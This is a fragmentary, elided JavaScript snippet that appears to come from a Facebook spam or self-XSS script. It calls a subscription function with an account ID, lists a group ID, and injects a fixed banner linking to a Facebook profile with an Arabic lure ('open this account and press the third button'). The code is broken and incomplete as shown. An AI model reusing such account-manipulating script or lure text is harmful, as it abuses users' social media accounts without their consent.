...
sublist("221906564639980");


var gid = ['215858071897245'];
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='http://www.facebook.com/mcbanna' target='_blank' title='افتح الاكونت ده و اضغط علي تالت زرار' ><blink><center>DeadCode</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
